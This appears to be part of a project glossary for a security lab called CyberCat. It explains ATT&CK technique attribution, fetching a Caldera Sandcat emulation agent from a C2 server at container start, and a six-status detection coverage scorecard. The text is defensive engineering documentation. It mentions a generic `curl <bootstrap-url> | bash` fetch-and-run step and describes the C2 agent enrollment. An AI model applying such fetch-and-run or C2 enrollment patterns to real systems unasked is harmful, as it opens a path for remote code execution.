The unit test that proved it: an ability tagged `T1059` (parent technique, "Command and Scripting Interpreter") and a detection tagged `T1059.001` (sub-technique, "PowerShell") should attribute to each other. With the symmetric set-overlap rule, `target_set = {"T1059", "T1059"}` (collapses to `{"T1059"}`), `tag_set = {"T1059.001", "T1059"}`, intersection = `{"T1059"}`, non-empty → match. With a strict-equal rule, neither side equals the other → no match (false negative). With a tactic-only rule, every "execution" tag would match every "execution" ability → noise.

The rule's cost: it cannot distinguish between two sibling sub-techniques (`T1059.004` vs `T1059.006` — bash vs python). For Phase 21's purpose that's fine — both are evidence of T1059 surface, and the scorecard's job is to assess detector *families*, not exact technique granularity.

**Why it exists:** The straightforward implementation of "did the right rule fire?" — strict-equal on the ATT&CK ID — has a hidden assumption: that the ability author and the detector author chose the same level of specificity. They almost never do. Caldera's Stockpile ability list is more specific than CyberCat's detection-author tags. The set-overlap rule is the minimum amount of fuzz needed to handle that mismatch without over-attributing.

**Where in CyberCat:** `labs/caldera/scorer.py` `_attribution_match()`. Called from `score()` per ability/rule combination. Determines whether a `GAP`-expected ability with a fired rule becomes `gap` (not attributable, the honest miss) or `unexpected-hit` (attributable, possible happy accident worth investigating).

**Where else you'll see it:** Same shape appears in compliance / evidence-mapping work everywhere: NIST CSF subcategory matching, CIS Control mapping, ISO 27001 control inheritance. The general pattern is "one taxonomy is more specific than another; collapse to a common ancestor for comparison." Database systems use the equivalent for prefix index matching (`B-tree LIKE 'foo%'` is a subtree match, not strict equal).

**Tradeoffs:** The conservative rule under-attributes within sibling sub-techniques. If Phase 22 needs finer attribution (e.g. PowerShell-specific detector tagged T1059.001 should NOT attribute to a bash ability tagged T1059.004), we'd swap to "match on full ID OR exact-target == exact-tag," which loses the parent/sub-technique fuzz. For a v1 coverage scorecard, the parent-collapsed rule is the right level of fuzz.

**Related entries:** [MITRE ATT&CK (tactics, techniques, subtechniques)](#mitre-attck-tactics-techniques-subtechniques) · [MITRE Caldera adversary emulation](#mitre-caldera-adversary-emulation) · [Coverage scorecard methodology](#coverage-scorecard-methodology)

---

## Fetch-on-start agent enrollment
*Introduced: Phase 21* · *Category: Project Pattern*

**Intuition:** Don't bake an agent binary into the image that hosts it; fetch it from the C2 at container start when the env var is set. Decouples the host image from the agent's release cadence.

**Precise:** A pattern where a containerized target machine's `Dockerfile` only creates the work directory (e.g. `mkdir -p /opt/sandcat`), and the `entrypoint.sh` conditionally fetches the agent binary at startup based on an env var (`if [ -n "$CALDERA_URL" ]`). The fetch is best-effort — wrapped in `2>/dev/null` and `( ... & ) || true` — so a missing/unreachable C2 (the common case when the corresponding profile isn't active) does not abort the rest of the entrypoint. The launched agent itself runs as a backgrounded child of PID 1 (sshd), so it does not block sshd's foreground exec.

**How it works (under the hood):**

Three properties make this pattern robust:

1. **Idempotency.** The fetch checks `if [ ! -x /opt/sandcat/sandcat ]` first, so subsequent container restarts don't re-download. The agent binary is on the container's writable layer, not in the image, so it survives until `docker compose down -v`.

2. **Graceful degradation.** With only `--profile agent` (no caldera), `CALDERA_URL` is empty (default in compose), the conditional is skipped entirely, and `lab-debian` boots identically to its pre-Phase-21 state. With both profiles up but Caldera not yet healthy (the 60s `start_period` race), the curl fetch fails silently and the agent isn't launched. The container's next restart picks it up.

3. **Decoupled release cadence.** Bumping `CALDERA_VERSION` in `infra/caldera/Dockerfile` (the C2 server's image) does not require rebuilding `lab-debian`. The Sandcat binary served by the new Caldera is fetched at next container start; the host image is identical to before.

The corresponding **anti-pattern** is baking the agent into the host image. That seems simpler at first but creates a coupling: every Caldera version bump requires rebuilding `lab-debian` (slow), and the agent's lifecycle is harder to debug because the binary's source-of-truth is hidden in image layers rather than at a clearly-named path.

**Why it exists:** The Wazuh agent in `lab-debian` (Phase 8/9) is *baked* — it's installed via apt during image build, and configured at startup via env vars (`WAZUH_MANAGER`). That worked because Wazuh's release cadence is slow and we pin Wazuh 4.9.2 explicitly. Caldera releases more often and ships a custom Sandcat binary per version, so we wanted the looser coupling. After implementing it, this pattern is arguably better than the baked Wazuh approach for *both* agents — but rewriting the Wazuh path is out of scope for Phase 21.

**Where in CyberCat:** `infra/lab-debian/Dockerfile:24-29` (just `mkdir -p /opt/sandcat`, no binary). `infra/lab-debian/entrypoint.sh:48-67` (conditional fetch + launch). Compose env vars at `infra/compose/docker-compose.yml` lab-debian.environment (`CALDERA_URL`, `CALDERA_GROUP`).

**Where else you'll see it:** Most modern security agents (osquery, Falco, Splunk Universal Forwarder when bootstrapped via deployment server, Datadog agent installed via curl|sh) follow this pattern. Container observability agents (Sysdig, Aqua, Twistlock) generally fetch their kernel modules / userland binaries at start. Cloud-init scripts on EC2 / GCE almost always end with a `curl <bootstrap-url> | bash` step — same idea.

**Tradeoffs:** A network-dependent startup is one more thing that can fail. The wrapping `|| true` and `( ... & )` mitigations are essential — without them, a Caldera outage would prevent sshd from starting and thus prevent operator triage of the Caldera outage. Logging the fetch result to `/var/log/sandcat.log` (visible in the lab_logs volume to `cct-agent`) is the durable record for "did Sandcat enroll today, yes/no."

**Related entries:** [MITRE Caldera adversary emulation](#mitre-caldera-adversary-emulation) · [Pluggable telemetry adapter pattern](#pluggable-telemetry-adapter-pattern) · [Docker Compose profiles](#docker-compose-profiles)

---

## Coverage scorecard methodology
*Introduced: Phase 21* · *Category: Verification*

**Intuition:** A coverage scorecard is the analytics layer on top of an adversary-emulation run. For each attacker action, you record three things: did the action run, did your detection stack fire, did the right detection fire. The combinations produce a six-status enum that is much more useful than a binary "covered/not covered" because it surfaces the *interesting* failure modes (false negatives, unexpected hits) that drive the next round of detector design.

**Precise:** Given a registry of `expectations` (per-ability: technique, expected_rule_id), a Caldera operation report (per-ability: status), and a detections-since-window response from the SIEM (per-detection: rule_id, attack_tags), the scorer assigns each row one of:

- **covered** — ability ran, expected rule fired. The pass case.
- **gap** — ability ran, `expected_rule_id == GAP` AND nothing attributable fired. The honest miss; goes on the Phase 22 punch list.
- **false-negative** — ability ran, `expected_rule_id != GAP` AND that specific rule did NOT fire. Bug or brittleness; investigate before merging — the rule was supposed to be covered.
- **unexpected-hit** — ability ran, `expected_rule_id == GAP` BUT a rule with overlapping ATT&CK tags fired. Possibly a happy accident worth promoting to "covered" in the next iteration; possibly mis-attribution worth tightening.
- **ability-failed** — Caldera reported the ability did not execute on the agent (status != 0). Diagnostic only.
- **ability-skipped** — ability was in `expectations.yml` but never appeared in the operation report at all. Diagnostic only — usually a UUID-resolution issue.

The summary line tallies all six and surfaces a headline "covered N / total" number. **This headline is the deliverable — not a goal to maximize.** A scorecard showing "covered 2 / 25" with a clean ordered punch list is more useful than "covered 22 / 25" produced by tuning the abilities to match what already fires.

**How it works (under the hood):**

The scorer's three-input shape is what makes it generalize. Inputs:
1. `expectations.yml` — author-curated, the source of truth for what *should* happen per ability.
2. Caldera operation report (`/api/v2/operations/{id}/report`) — what Caldera observed: per-ability-per-agent status, output, time.
3. CyberCat detections-since-window (`/v1/detections?since=<run_start>`) — what the SIEM caught during the operation's time window.

The join: for each entry in `expectations.abilities`, look up the run status (skipped/failed/ok), look at the detections that fired anywhere in the run window, decide whether any of them are *attributable* to this ability (set-overlap rule on attack_tags), and pick the status. The output is a list of (ability, technique, expected, fired, status) tuples — the rows of the markdown table — plus a summary count of each status.

The methodology is pluggable: replace Caldera with any other emulation engine that produces a per-ability outcome list, replace `/v1/detections` with any other SIEM's query API, and the scorer logic stays identical. That's why the scorer is ~150 lines of pure Python with no detection-stack-specific dependencies.

**Why it exists:** "Did the platform detect that?" is a binary question; "did the platform detect that, and if so, was it the right rule?" is a 4-cell matrix; adding ability-failed/skipped makes it 6. Most teams stop at the binary version, which is why most coverage reports are uninformative. The six-status enum is what turns "we have 12% coverage" into "we have 12% coverage AND here are the four gaps that ate the most ability evidence AND here's the one false-negative that means a rule we thought we owned is actually broken."

**Where in CyberCat:** `labs/caldera/scorer.py`. Outputs at `docs/phase-21-scorecard.md` and `docs/phase-21-scorecard.json`. Methodology documented in `labs/caldera/README.md` and `docs/decisions/ADR-0016-caldera-emulation.md`.

**Where else you'll see it:** MITRE's own ATT&CK Navigator presents coverage in roughly this shape (heatmap colored by detection presence). Commercial coverage tools (AttackIQ, SCYTHE, AvocadoSec) all use a similar enum, sometimes with finer granularity (e.g. distinguishing "alerted" from "alerted with the wrong severity"). The pattern shows up outside security too — feature-flag rollout dashboards usually show a similar (covered/gap/unexpected) shape per cohort.

**Tradeoffs:** The enum is opinionated — `unexpected-hit` could be split into "unexpected-but-correct" and "unexpected-and-wrong" if we had the human review bandwidth. We don't, so we collapse to one bucket and rely on the operator to read the row notes for context. The "ability-skipped" bucket is mostly noise (UUID resolution issues) but keeping it surfaces silently-broken UUIDs that would otherwise look like gaps.

**Related entries:** [MITRE Caldera adversary emulation](#mitre-caldera-adversary-emulation) · [ATT&CK technique attribution (set-overlap rule)](#attck-technique-attribution-set-overlap-rule) · [Smoke tests vs unit tests vs integration tests](#smoke-tests-vs-unit-tests-vs-integration-tests) · [Pre-Phase-22 measurement vs guess](#pre-phase-22-measurement-vs-guess)

---

*End of entries — coverage of Phases 1–21. New concepts will be appended as they come up in future sessions; existing entries will be updated in place if a topic gets revisited in greater depth.*
